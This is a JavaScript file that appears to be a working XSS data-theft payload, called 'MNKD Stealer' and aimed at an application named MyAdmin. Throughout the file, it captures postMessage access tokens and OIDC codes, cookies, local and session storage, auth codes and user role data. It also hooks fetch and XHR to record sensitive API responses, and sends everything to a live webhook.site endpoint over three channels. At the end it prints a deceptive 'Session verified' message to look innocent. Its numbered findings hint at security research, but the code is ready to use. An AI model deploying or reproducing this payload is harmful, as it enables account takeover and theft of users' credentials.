/**
 * MNKD Stealer — MyAdmin Token & Data Exfiltration Payload
 * =========================================================
 *
 * Hosted at: https://telojos11.github.io/mnkd/stealer.js
 * Triggered by: XSS injection into MyAdmin (via safe pipe or innerHTML)
 *
 * Once loaded inside MyAdmin's origin, this script:
 *   1. Passively intercepts SET_ACCESS_TOKEN from postMessage (Finding #2)
 *   2. Steals window.inapp user data (Finding #7)
 *   3. Steals auth codes from sessionStorage (Finding #8)
 *   4. Dumps all cookies + localStorage
 *   5. Hooks fetch/XHR to capture API responses
 *   6. Beacons all data to attacker's webhook
 *
 * USAGE:
 *   <script src="https://telojos11.github.io/mnkd/stealer.js"></script>
 */

(function() {
  "use strict";

  // =======================================================================
  // CONFIG — Change WEBHOOK to your webhook.site UUID
  // =======================================================================
  var WEBHOOK = "https://webhook.site/f59686a0-8650-40a5-8f62-32b4e98dd15c";
  var TAG = "[MNKD]";
  var DEMO = WEBHOOK.indexOf("YOUR_UUID") > -1;

  // =======================================================================
  // STATE
  // =======================================================================
  var sid = "s_" + Math.random().toString(36).substring(2, 10);
  var sent = {};    // dedup hash → true
  var queue = [];   // pending beacons
  var flushed = false;

  function log(msg, color) {
    if (DEMO) console.log("%c" + TAG + " " + msg, "color:" + (color||"#aaa"));
  }

  // =======================================================================
  // BEACON — Triple channel exfiltration
  // =======================================================================
  function send(data, label) {
    label = label || "data";
    var payload = {
      sid: sid,
      ts: new Date().toISOString(),
      label: label,
      loc: location.href,
      dom: document.domain,
      ref: document.referrer || "",
      ua: navigator.userAgent,
      data: data,
    };
    var body;
    try { body = JSON.stringify(payload); } catch(e) { body = JSON.stringify({error:e.message}); }

    // Dedup
    var hash = body.length + ":" + body.substring(0, 40);
    if (sent[hash]) return;
    sent[hash] = true;

    if (DEMO) {
      console.log("%c" + TAG + " [EXFIL " + label + "]", "color:lime;font-weight:bold", data);
      return;
    }

    // Channel 1: sendBeacon
    try {
      var blob = new Blob([body], {type:"application/json"});
      if (navigator.sendBeacon(WEBHOOK, blob)) { log("✓ beacon: " + label, "lime"); return; }
    } catch(e) {}

    // Channel 2: fetch keepalive
    try {
      fetch(WEBHOOK, {
        method: "POST", body: body, mode: "no-cors", keepalive: true,
        headers: {"Content-Type":"text/plain"}
      }).then(function() { log("✓ fetch: " + label, "lime"); })
        .catch(function() {});
    } catch(e) {}

    // Channel 3: Image pixel (GET fallback)
    try {
      var enc = encodeURIComponent(body.substring(0, 1800));
      new Image().src = WEBHOOK + "?f=" + enc;
    } catch(e) {}
  }

  // =======================================================================
  // MODULE 1: postMessage Token Interceptor (Finding #2)
  // =======================================================================
  function hookPostMessage() {
    var orig = window.addEventListener;
    // We don't override — we just add our own listener
    window.addEventListener("message", function(e) {
      if (!e.data || typeof e.data !== "object") return;

      // THE JACKPOT — line 302866: postMessage({type:"SET_ACCESS_TOKEN", token}, "*")
      if (e.data.type === "SET_ACCESS_TOKEN" && e.data.token) {
        send({
          module: "postMessage_intercept",
          finding: "FINDING_2",
          token: e.data.token,
          origin: e.origin,
          tokenLength: e.data.token.length,
        }, "TOKEN_CAPTURED");
        log("🔑 ACCESS TOKEN: " + e.data.token.substring(0, 40) + "...", "#ff0");
      }

      // OIDC tokens (Findings #3, #6)
      if (e.data.source === "oidc-client" && e.data.url) {
        var sp = new URLSearchParams((e.data.url.split("?")[1] || ""));
        var code = sp.get("code"), idt = sp.get("id_token"), at = sp.get("access_token");
        if (code || idt || at) {
          send({
            module: "oidc_intercept",
            finding: "FINDING_3_6",
            code: code, id_token: idt, access_token: at,
            url: e.data.url, origin: e.origin,
          }, "OIDC_TOKENS");
          log("🔐 OIDC tokens captured", "#ff0");
        }
      }
    });
    log("postMessage hook installed", "lime");
  }

  // =======================================================================
  // MODULE 2: window.inapp (Finding #7)
  // =======================================================================
  function stealInapp() {
    if (!window.inapp) { log("window.inapp not found", "#f80"); return; }
    var d = {};
    try {
      d.userName = window.inapp.userName;
      d.userType = window.inapp.userType;
      d.roles = window.inapp.roles;
      d.languagePreference = window.inapp.languagePreference;
      d.version = window.inapp.version;
      d.userActiveDays = window.inapp.userActiveDays;
      d.isAdmin = Array.isArray(d.roles) && d.roles.some(function(r) {
        return /admin|superuser/i.test(r?.name || r);
      });
    } catch(e) { d._error = e.message; }

    send({ module: "inapp", finding: "FINDING_7", severity: d.isAdmin ? "CRITICAL" : "HIGH", ...d }, "INAPP");
    log("window.inapp: " + (d.userName || "?") + " roles=" + JSON.stringify(d.roles), "#0ff");
  }

  // =======================================================================
  // MODULE 3: sessionStorage Auth Codes (Finding #8)
  // =======================================================================
  function stealAuthCodes() {
    var a = {};
    try {
      a.auth_code = sessionStorage.getItem("myinstall_auth_code");
      a.auth_code_validated = sessionStorage.getItem("myinstall_auth_code_validated");
      a.auth_code_timestamp = sessionStorage.getItem("myinstall_auth_code_timestamp");
    } catch(e) { a._error = e.message; }
    if (a.auth_code || a.auth_code_validated) {
      send({ module: "auth_codes", finding: "FINDING_8", ...a }, "AUTH_CODES");
      log("🔓 Auth codes from sessionStorage", "#ff0");
    }
  }

  // =======================================================================
  // MODULE 4: Cookies
  // =======================================================================
  function stealCookies() {
    var raw = document.cookie;
    if (!raw) return;
    var parsed = {};
    raw.split(";").forEach(function(c) {
      var kv = c.trim().split("=");
      if (kv[0]) parsed[kv[0].trim()] = kv.slice(1).join("=");
    });

    var sensitive = ["access_token","id_token","refresh_token","ASPSESSIONID","XSRF-TOKEN",
                     "CustomerID","UserConfig","Authorization","FedAuth",".AspNet"];
    var sens = {};
    Object.keys(parsed).forEach(function(k) {
      if (sensitive.some(function(s) { return k.toLowerCase().indexOf(s.toLowerCase()) > -1; })) {
        sens[k] = parsed[k];
      }
    });

    send({ module: "cookies", count: Object.keys(parsed).length,
           cookies: parsed, sensitive: sens }, "COOKIES");
    log("Cookies: " + Object.keys(parsed).length + " total, " + Object.keys(sens).length + " sensitive", "#0ff");
  }

  // =======================================================================
  // MODULE 5: localStorage + sessionStorage
  // =======================================================================
  function stealStorage() {
    var ls = {}, ss = {};
    try { for (var i=0; i<localStorage.length; i++) {
      var k = localStorage.key(i); ls[k] = localStorage.getItem(k); }
    } catch(e) { ls._error = e.message; }
    try { for (var i=0; i<sessionStorage.length; i++) {
      var k = sessionStorage.key(i); ss[k] = sessionStorage.getItem(k); }
    } catch(e) { ss._error = e.message; }

    send({ module: "storage", localStorage: ls, sessionStorage: ss }, "STORAGE");
    log("Storage: " + Object.keys(ls).length + " local, " + Object.keys(ss).length + " session", "#0ff");
  }

  // =======================================================================
  // MODULE 6: Fetch/XHR Hook
  // =======================================================================
  function hookAPI() {
    var sensitive = ["/api/v1/Users","/api/v1/EnvironmentSettings","/api/v1/FeatureFlag",
                     "/token","/auth","/identity","/login"];
    function isSensitive(url) {
      return sensitive.some(function(s) { return url.indexOf(s) > -1; });
    }

    // Hook fetch
    var origFetch = window.fetch;
    window.fetch = function() {
      var url = typeof arguments[0] === "string" ? arguments[0] : (arguments[0]?.url || "");
      return origFetch.apply(this, arguments).then(function(r) {
        if (isSensitive(url)) {
          try {
            var clone = r.clone();
            clone.text().then(function(body) {
              send({ module: "api_fetch", url: url, status: r.status,
                     body: body.substring(0, 4000) }, "API_RESP");
            }).catch(function(){});
          } catch(e) {}
        }
        return r;
      });
    };

    // Hook XHR
    var O = XMLHttpRequest.prototype.open;
    var S = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(m, u) { this._u = u; return O.apply(this, arguments); };
    XMLHttpRequest.prototype.send = function() {
      var self = this, u = self._u || "";
      self.addEventListener("load", function() {
        if (isSensitive(u)) {
          send({ module: "api_xhr", method: self._m, url: u, status: self.status,
                 body: (self.responseText||"").substring(0, 4000) }, "API_XHR");
        }
      });
      return S.apply(this, arguments);
    };
    log("API hooks installed", "lime");
  }

  // =======================================================================
  // MODULE 7: Page Metadata
  // =======================================================================
  function collectMeta() {
    send({
      module: "metadata",
      url: location.href, origin: location.origin, pathname: location.pathname,
      search: location.search, hash: location.hash, title: document.title,
      ngVersion: (document.querySelector("[ng-version]")||{}).getAttribute?.("ng-version") || "unknown",
      csp: (function() {
        var m = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
        return m ? m.content : "not-set";
      })(),
    }, "META");
  }

  // =======================================================================
  // CLEANUP
  // =======================================================================
  window.addEventListener("beforeunload", function() {
    send({ module: "unload", event: "page_exit", url: location.href }, "UNLOAD");
  });

  // =======================================================================
  // INIT
  // =======================================================================
  log("Stealer loading... sid=" + sid, "#0ff");
  log("Target: " + document.domain + " | " + (DEMO?"DEMO":"LIVE"), DEMO?"#ff0":"#0f0");

  hookPostMessage();      // Must be FIRST — before any messages arrive
  stealCookies();
  stealStorage();
  stealInapp();
  stealAuthCodes();
  collectMeta();
  hookAPI();

  log("✓ Stealer initialized — " + (DEMO?"data shown in console":"exfiltrating to webhook"), "lime");

  // OPSEC: Look innocent
  if (!DEMO) {
    console.log("%c✓ Session verified", "color:green;font-weight:bold");
    console.log("%cYou may close this panel.", "color:gray");
  }
})();
